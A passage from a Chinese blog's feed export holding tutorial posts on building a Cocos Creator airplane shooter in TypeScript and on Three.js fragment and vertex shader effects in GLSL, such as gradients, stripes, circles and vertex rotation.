class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">UIManager</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    @property(GameManager)</span><br><span class="line">    public gameManager:GameManager = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    @property(Node)</span><br><span class="line">    public player: Node = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    public playerSpeed = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    start() &#123;</span><br><span class="line">      <span class="comment">// 控制玩家飞机移动</span></span><br><span class="line">      input.on(Input.EventType.TOUCH_START, <span class="keyword">this</span>._touchStart, <span class="keyword">this</span>)</span><br><span class="line">      input.on(Input.EventType.TOUCH_MOVE, <span class="keyword">this</span>._touchMove, <span class="keyword">this</span>)</span><br><span class="line">      input.on(Input.EventType.TOUCH_END, <span class="keyword">this</span>._touchEnd, <span class="keyword">this</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _touchStart() &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.gameManager.isGameStart) &#123;</span><br><span class="line">        <span class="keyword">this</span>.gameManager.setIsShooting(<span class="literal">true</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _touchMove(touch: Touch) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="keyword">this</span>.gameManager.isGameStart) <span class="keyword">return</span></span><br><span class="line">      <span class="keyword">const</span> delta = touch.getDelta()</span><br><span class="line">      <span class="keyword">const</span> pos = <span class="keyword">this</span>.player.position</span><br><span class="line">      <span class="keyword">this</span>.player.setPosition(</span><br><span class="line">        pos.x + <span class="number">0.015</span> * <span class="keyword">this</span>.playerSpeed * delta.x,</span><br><span class="line">        pos.y,</span><br><span class="line">        pos.z - <span class="number">0.015</span> * <span class="keyword">this</span>.playerSpeed * delta.y</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _touchEnd() &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="keyword">this</span>.gameManager.isGameStart) <span class="keyword">return</span></span><br><span class="line">      <span class="keyword">this</span>.gameManager.setIsShooting(<span class="literal">false</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-gameMain-ts-游戏主逻辑"><a href="#3-2-gameMain-ts-游戏主逻辑" class="headerlink" title="3.2 gameMain.ts 游戏主逻辑"></a>3.2 gameMain.ts 游戏主逻辑</h4><p>创建脚本<code>gameMain.ts</code>用来处理游戏主逻辑，挂载到scene下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; _decorator, Component, Node, Prefab, instantiate, director &#125; <span class="keyword">from</span> <span class="string">'cc'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Player &#125; <span class="keyword">from</span> <span class="string">'../Player'</span>;</span><br><span class="line"><span class="keyword">const</span> &#123; ccclass, property &#125; = _decorator;</span><br><span class="line"></span><br><span class="line">@ccclass(<span class="string">'GameManager'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">GameManager</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="comment">// player</span></span><br><span class="line">    @property(Node)</span><br><span class="line">    public player: Player = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// bullet</span></span><br><span class="line">    @property(Prefab)</span><br><span class="line">    public bullet01: Prefab = <span class="literal">null</span></span><br><span class="line">    <span class="comment">// enemy</span></span><br><span class="line">    @property(Prefab)</span><br><span class="line">    public enemy: Prefab = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    @property(Node)</span><br><span class="line">    bulletRoot: Node = <span class="literal">null</span></span><br><span class="line">    @property(Node)</span><br><span class="line">    enemyRoot: Node = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    public isGameStart = <span class="literal">true</span></span><br><span class="line">    private _isShooting = <span class="literal">false</span></span><br><span class="line">    private _shootTime = <span class="number">0.3</span> <span class="comment">// 每0.3s发射一次子弹</span></span><br><span class="line">    private _curShootingTime = <span class="number">0.4</span> <span class="comment">// 距离上次发射的时间</span></span><br><span class="line">    private _enemyTime = <span class="number">3</span> <span class="comment">// 每0.5s新增一次敌机</span></span><br><span class="line">    private _curEnemyTime = <span class="number">0</span> <span class="comment">// 距离上次敌机出现的时间</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private _init() &#123;</span><br><span class="line">        <span class="keyword">this</span>.player.init()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    start() &#123;</span><br><span class="line">        <span class="keyword">this</span>.createEnemy(<span class="number">4</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    update(deltaTime: number) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.isGameStart) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 玩家飞机发射子弹</span></span><br><span class="line">        <span class="keyword">this</span>.createPlayerBullet(deltaTime)</span><br><span class="line">       </span><br><span class="line">        <span class="comment">// 出现敌机</span></span><br><span class="line">        <span class="keyword">this</span>.createEnemy(deltaTime)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 玩家飞机持续发射子弹</span></span><br><span class="line">    private createPlayerBullet(deltaTime: number) &#123;</span><br><span class="line">      <span class="keyword">this</span>._curShootingTime += deltaTime</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>._isShooting &amp;&amp; <span class="keyword">this</span>._curShootingTime &gt; <span class="keyword">this</span>._shootTime) &#123;</span><br><span class="line">        <span class="keyword">const</span> pos = <span class="keyword">this</span>.player.position;</span><br><span class="line">        <span class="keyword">const</span> bullet = instantiate(<span class="keyword">this</span>.bullet01)</span><br><span class="line">        bullet.setParent(<span class="keyword">this</span>.bulletRoot)</span><br><span class="line">        bullet.setPosition(pos.x, <span class="number">1</span>, pos.z - <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">this</span>._curShootingTime = <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增加敌机</span></span><br><span class="line">    private createEnemy(deltaTime: number) &#123;</span><br><span class="line">      <span class="keyword">this</span>._curEnemyTime += deltaTime</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>._curEnemyTime &gt; <span class="keyword">this</span>._enemyTime) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;<span class="number">5</span>; i++) &#123;</span><br><span class="line">          <span class="keyword">const</span> elem = instantiate(<span class="keyword">this</span>.enemy)</span><br><span class="line">          elem.setParent(<span class="keyword">this</span>.enemyRoot)</span><br><span class="line">          elem.setPosition(<span class="number">-3.5</span> + <span class="number">2</span> * i, <span class="number">1</span>, <span class="number">-10</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>._curEnemyTime = <span class="number">0</span></span><br><span class="line">      &#125; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public setIsShooting(value: boolean) &#123;</span><br><span class="line">      <span class="keyword">this</span>._isShooting = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-其他"><a href="#4-其他" class="headerlink" title="4. 其他"></a>4. 其他</h3><h4 id="4-1-关卡切换"><a href="#4-1-关卡切换" class="headerlink" title="4.1 关卡切换"></a>4.1 关卡切换</h4><p>保存当前场景为lv1.scene，在Asset里复制该场景，粘贴为lv2.scene, lv3.scene。在适当时候调用</p><ul><li><em><code>director.loadScene(&#39;lv2&#39;)</code></em> 切换关卡</li><li><em><code>director.loadScene(director.getScene().name)</code></em> 重新加载当前关卡</li></ul><p><br></p><h4 id="4-2-开始界面"><a href="#4-2-开始界面" class="headerlink" title="4.2 开始界面"></a>4.2 开始界面</h4><ul><li>create UI组件 button - Label”点击屏幕开始” - 场景编辑器切换2D模式 - content size: 2048 * 2048 - color 设置为半透明黑（蒙层效果） - 点击canvas下的camera可以看到文字效果</li><li>新建<code>start.ts</code> - 关联到button上，设置点击屏幕时，蒙层消失效果</li><li>设置click Events： Button组件, start, onBtnClick<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; _decorator, Component, Node &#125; <span class="keyword">from</span> <span class="string">'cc'</span>;</span><br><span class="line"><span class="keyword">const</span> &#123; ccclass, property &#125; = _decorator;</span><br><span class="line"></span><br><span class="line">@ccclass(<span class="string">'start'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">start</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  onBtnClick() &#123;</span><br><span class="line">    <span class="keyword">this</span>.node.active = <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="4-3-摄像机跟随"><a href="#4-3-摄像机跟随" class="headerlink" title="4.3 摄像机跟随"></a>4.3 摄像机跟随</h4><p>适合跑酷游戏，新建一个<code>followTarget.ts</code>, 挂载在<em><code>Main Camera</code></em>上<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@ccclass(<span class="string">'FollowTarget'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">FollowTarget</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  @property(Node)</span><br><span class="line">  player: Node;</span><br><span class="line"></span><br><span class="line">  offset = <span class="keyword">new</span> Vec3(<span class="number">0</span>, <span class="number">5</span>, <span class="number">2</span>) <span class="comment">// camera应该在玩家的后上方</span></span><br><span class="line">  tmpPos = <span class="keyword">new</span> Vec3()</span><br><span class="line">  </span><br><span class="line">  update() &#123;</span><br><span class="line">    <span class="keyword">this</span>.player.getPosition(<span class="keyword">this</span>.tmpPos) <span class="comment">// 将this.player.position传入this.tmpPos向量中</span></span><br><span class="line">    <span class="keyword">this</span>.tmpPos.add(<span class="keyword">this</span>.offset) <span class="comment">// 叠加一定距离，设置camera position实现跟随</span></span><br><span class="line">    <span class="keyword">this</span>.node.position = <span class="keyword">this</span>.tmpPos</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="">b 站 - Cocos 引擎官方 - 做一款经典射击游戏</a></li><li><a href="https://www.bilibili.com/video/BV1Qt4y1c7Wu?spm_id_from=333.788.videopod.sections&amp;vd_source=2afb712305742eec14a61ccd3d5b51c9" target="_blank" rel="noopener">麒麟子MrKylin - 零基础游戏开发新手入门教程</a></li><li><a href="https://github.com/cocos-creator/tutorial-airplane" target="_blank" rel="noopener">鹰击长空-代码仓库</a></li></ul>]]></content>
      
      <categories>
          
          <category> 草稿 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Shader片元着色器</title>
      <link href="/2024/12/04/threejs-%E7%89%87%E5%85%83%E7%9D%80%E8%89%B2%E5%99%A8/"/>
      <url>/2024/12/04/threejs-%E7%89%87%E5%85%83%E7%9D%80%E8%89%B2%E5%99%A8/</url>
      <content type="html"><![CDATA[<blockquote><p><code>uv</code>是每个片元的数值，左下角 vUv 为 (0.0, 0.0) 所以对应的 vUv.x=vUv.y=0.0。同理左上角就是 (0.0, 1.0)、右下角 (1.0, 0.0)、右上角 (1.0, 1.0)、最中间 (0.5, 0.5)。*</p></blockquote><h3 id="1-颜色效果"><a href="#1-颜色效果" class="headerlink" title="1. 颜色效果"></a>1. 颜色效果</h3><h4 id="1-1-颜色渐变"><a href="#1-1-颜色渐变" class="headerlink" title="1.1 颜色渐变"></a>1.1 颜色渐变</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">varying vec2 vUv;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  gl_FragColor = vec4(vUv.x, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-2-颜色突变"><a href="#1-2-颜色突变" class="headerlink" title="1.2 颜色突变"></a>1.2 颜色突变</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">float color = step(<span class="number">0.5</span>, vUv.x); <span class="comment">// 改成0.3, 突变的位置也会随之改变</span></span><br><span class="line">gl_FragColor = vec4(vec3(color), <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><h4 id="1-3-熟悉的青红、蓝粉效果"><a href="#1-3-熟悉的青红、蓝粉效果" class="headerlink" title="1.3 熟悉的青红、蓝粉效果"></a>1.3 熟悉的青红、蓝粉效果</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gl_FragColor = vec4(vUv, <span class="number">0.0</span>, <span class="number">1.0</span>); <span class="comment">// 青红</span></span><br><span class="line">gl_FragColor = vec4(vUv, <span class="number">1.0</span>, <span class="number">1.0</span>); <span class="comment">// 蓝粉</span></span><br></pre></td></tr></table></figure><h4 id="1-4-条纹效果"><a href="#1-4-条纹效果" class="headerlink" title="1.4 条纹效果"></a>1.4 条纹效果</h4><p>重复条纹效果要用<code>fract</code>，返回x.floor() - x的值。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 取vUv.x * 3.0小数，&lt; 0.5返回0，&gt;0.5返回1</span></span><br><span class="line">float color = step(<span class="number">0.5</span>, fract(vUv.x * <span class="number">3.0</span>))</span><br><span class="line">gl_FragColor = vec4(vec3(color), <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure></p><h4 id="1-5-指定颜色渐变、突变、重复渐变、条纹效果"><a href="#1-5-指定颜色渐变、突变、重复渐变、条纹效果" class="headerlink" title="1.5 指定颜色渐变、突变、重复渐变、条纹效果"></a>1.5 指定颜色渐变、突变、重复渐变、条纹效果</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vec3 color1 = vec3(<span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">0.0</span>); <span class="comment">// 黄色</span></span><br><span class="line">vec3 color2 = vec3(<span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>); <span class="comment">// 青色</span></span><br><span class="line">float mixer = vUv.x; <span class="comment">// 渐变</span></span><br><span class="line"><span class="comment">// float mixer = step(0.5, vUv.x); // 突变</span></span><br><span class="line"><span class="comment">// float mixer = fract(vUv.x * 3.0); // 重复渐变</span></span><br><span class="line"><span class="comment">// float mixer = step(0.5, fract(vUv.x * 3.0)); // 条纹</span></span><br><span class="line">vec3 color = mix(color1, color2, mixer);</span><br><span class="line">gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-绘制图形"><a href="#2-绘制图形" class="headerlink" title="2. 绘制图形"></a>2. 绘制图形</h3><h4 id="2-1-圆形"><a href="#2-1-圆形" class="headerlink" title="2.1 圆形"></a>2.1 圆形</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">float dist = length(vUv - vec2(<span class="number">0.5</span>)); <span class="comment">// 将整体坐标移到正中心</span></span><br><span class="line">float radius = <span class="number">0.5</span>;</span><br><span class="line">float color = step(radius, dist);</span><br><span class="line">gl_FragColor = vec4(vec3(color), <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><h4 id="2-2-半径动态变化的圆"><a href="#2-2-半径动态变化的圆" class="headerlink" title="2.2 半径动态变化的圆"></a>2.2 半径动态变化的圆</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">varying vec2 vUv;</span><br><span class="line">uniform float uTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  float dist = length(vUv - vec2(<span class="number">0.5</span>)); <span class="comment">// 将整体坐标移到正中心</span></span><br><span class="line">  float radius = <span class="number">0.5</span> * (sin(uTime) * <span class="number">0.5</span> + <span class="number">0.5</span>);</span><br><span class="line">  vec3 color = vec3(step(radius, dist));</span><br><span class="line">  gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-一组多个，半径动态变化的圆"><a href="#2-3-一组多个，半径动态变化的圆" class="headerlink" title="2.3 一组多个，半径动态变化的圆"></a>2.3 一组多个，半径动态变化的圆</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">varying vec2 vUv;</span><br><span class="line">uniform float uTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  <span class="comment">// 先重复 uv，再居中，再绘制圆形</span></span><br><span class="line">  float dist = length(fract(vUv * <span class="number">5.0</span>) - vec2(<span class="number">0.5</span>));</span><br><span class="line">  <span class="comment">// 半径大小随时间周期变化</span></span><br><span class="line">  float radius = <span class="number">0.5</span> * (sin(uTime + vUv.x + vUv.y) * <span class="number">0.5</span> + <span class="number">0.5</span>);</span><br><span class="line">  vec3 color = vec3(step(radius, dist));</span><br><span class="line">  gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-径向条纹-动画"><a href="#2-4-径向条纹-动画" class="headerlink" title="2.4 径向条纹(动画)"></a>2.4 径向条纹(动画)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">varying vec2 vUv;</span><br><span class="line">uniform float uTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  <span class="comment">// 先居中，后重复，再绘制圆形</span></span><br><span class="line">  float dist = fract(length(vUv - vec2(<span class="number">0.5</span>)) * <span class="number">5.0</span>);</span><br><span class="line">  <span class="comment">// 动画效果</span></span><br><span class="line">  <span class="comment">// float dist = fract((length(vUv - vec2(0.5)) /0.707 - uTime * 0.5) * 5.0);</span></span><br><span class="line">  float radius = <span class="number">0.5</span>;</span><br><span class="line">  vec3 color = vec3(step(radius, dist));</span><br><span class="line">  gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-5-指定颜色的圆形"><a href="#2-5-指定颜色的圆形" class="headerlink" title="2.5 指定颜色的圆形"></a>2.5 指定颜色的圆形</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vec3 color1 = vec3(<span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">0.0</span>);</span><br><span class="line">vec3 color2 = vec3(<span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>); </span><br><span class="line">float mixer = length(vUv - vec2(<span class="number">0.5</span>)); <span class="comment">// 圆形渐变</span></span><br><span class="line"><span class="comment">// mixer = step(0.25, mixer); // 圆形</span></span><br><span class="line">vec3 color = mix(color1, color2, mixer);</span><br><span class="line">gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><h4 id="2-6-对角线渐变"><a href="#2-6-对角线渐变" class="headerlink" title="2.6 对角线渐变"></a>2.6 对角线渐变</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vec3 color1 = vec3(<span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">0.0</span>);</span><br><span class="line">vec3 color2 = vec3(<span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>); </span><br><span class="line">float mixer = (vUv.x + vUv.y) / <span class="number">2.0</span>;</span><br><span class="line">vec3 color = mix(color1, color2, mixer);</span><br><span class="line"><span class="comment">// mixer = step(0.5, mixer); // 对角线突变</span></span><br><span class="line"><span class="comment">// vec3 color = vec3(mixer); // 黑白渐变</span></span><br><span class="line">gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><h4 id="2-7-棋盘格"><a href="#2-7-棋盘格" class="headerlink" title="2.7 棋盘格"></a>2.7 棋盘格</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vec3 color1 = vec3(<span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>);</span><br><span class="line">vec3 color2 = vec3(<span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>);</span><br><span class="line">float mask1 = step(<span class="number">0.5</span>, fract(vUv.x * <span class="number">3.0</span>));</span><br><span class="line">float mask2 = step(<span class="number">0.5</span>, fract(vUv.y * <span class="number">3.0</span>));</span><br><span class="line">float mixer = abs(mask1 - mask2);</span><br><span class="line">vec3 color = mix(color1, color2, mixer);</span><br><span class="line">gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 草稿 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Shader顶点着色器</title>
      <link href="/2024/12/04/threejs-%E9%A1%B6%E7%82%B9%E7%9D%80%E8%89%B2%E5%99%A8/"/>
      <url>/2024/12/04/threejs-%E9%A1%B6%E7%82%B9%E7%9D%80%E8%89%B2%E5%99%A8/</url>
      <content type="html"><![CDATA[<h3 id="1-旋转顶点"><a href="#1-旋转顶点" class="headerlink" title="1. 旋转顶点"></a>1. 旋转顶点</h3><p>让所有顶点绕 x 轴旋转 45°<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glsl-rotation-3d</span></span><br><span class="line">mat4 rotationMatrix(vec3 axis, float angle) &#123;</span><br><span class="line">    axis = normalize(axis);</span><br><span class="line">    float s = sin(angle);</span><br><span class="line">    float c = cos(angle);</span><br><span class="line">    float oc = <span class="number">1.0</span> - c;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> mat4(oc * axis.x * axis.x + c,           oc * axis.x * axis.y - axis.z * s,  oc * axis.z * axis.x + axis.y * s,  <span class="number">0.0</span>,</span><br><span class="line">                oc * axis.x * axis.y + axis.z * s,  oc * axis.y * axis.y + c,           oc * axis.y * axis.z - axis.x * s,  <span class="number">0.0</span>,</span><br><span class="line">                oc * axis.z * axis.x - axis.y * s,  oc * axis.y * axis.z + axis.x * s,  oc * axis.z * axis.z + c,           <span class="number">0.0</span>,</span><br><span class="line">                <span class="number">0.0</span>,                                <span class="number">0.0</span>,                                <span class="number">0.0</span>,                                <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vec3 rotate(vec3 v, vec3 axis, float angle) &#123;</span><br><span class="line">mat4 m = rotationMatrix(axis, angle);</span><br><span class="line"><span class="keyword">return</span> (m * vec4(v, <span class="number">1.0</span>)).xyz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  vUv = uv;</span><br><span class="line">  float PI = <span class="number">3.1415925</span>;</span><br><span class="line">  vec3 axis = vec3(<span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>);</span><br><span class="line">  float angle = PI / <span class="number">4.0</span>;</span><br><span class="line">  vec3 newPos = rotate(position, axis, angle);</span><br><span class="line">  gl_Position = projectionMatrix * modelViewMatrix * vec4(newPos, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="2-扭麻花"><a href="#2-扭麻花" class="headerlink" title="2. 扭麻花"></a>2. 扭麻花</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vUv = uv;</span><br><span class="line">vec3 axis = vec3(<span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>);</span><br><span class="line">float angle = position.x + uTime;</span><br><span class="line">vec3 newPos = rotate(position, axis, angle);</span><br><span class="line">gl_Position = projectionMatrix * modelViewMatrix * vec4(newPos, <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.cn/post/7340909611098554409" target="_blank" rel="noopener">手把手带你入门 Three.js Shader 系列（八）</a></li></ul>]]></content>
      
      <categories>
          
          <category> 草稿 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Shader GLSL语法</title>
      <link href="/2024/12/02/threejs-GLSL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2024/12/02/threejs-GLSL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
